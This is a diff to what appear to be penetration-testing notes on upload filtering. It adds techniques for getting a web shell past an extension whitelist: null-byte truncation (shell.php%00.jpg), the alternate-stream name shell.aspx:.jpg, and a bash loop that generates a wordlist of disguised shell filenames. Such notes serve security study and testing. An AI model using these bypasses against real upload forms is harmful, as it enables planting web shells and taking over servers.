@@ -25,6 +25,19 @@ Back end controls:
   White list:
     use double extention (e.g.  *.jpg.php)
     BUT
-    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))      match the last extention, so can not bypass
+    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))      $ match the last extention, so can not bypass
 
+    shell.php%00.jpg 适用于版本为 5.X 或更早的 PHP 服务器，因为它会导致 PHP Web 服务器在 (%00) 之后结束文件名，并将其存储为 (shell.php)，同时仍然通过白名单。
+    shell.aspx:.jpg，这也应该会将文件写为 shell.aspx
   
+
+Bash hand make wordlist:
+  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+      for ext in '.php' '.phps'; do
+          echo "shell$char$ext.jpg" >> wordlist.txt
+          echo "shell$ext$char.jpg" >> wordlist.txt
+          echo "shell.jpg$char$ext" >> wordlist.txt
+          echo "shell.jpg$ext$char" >> wordlist.txt
+      done
+  done
+
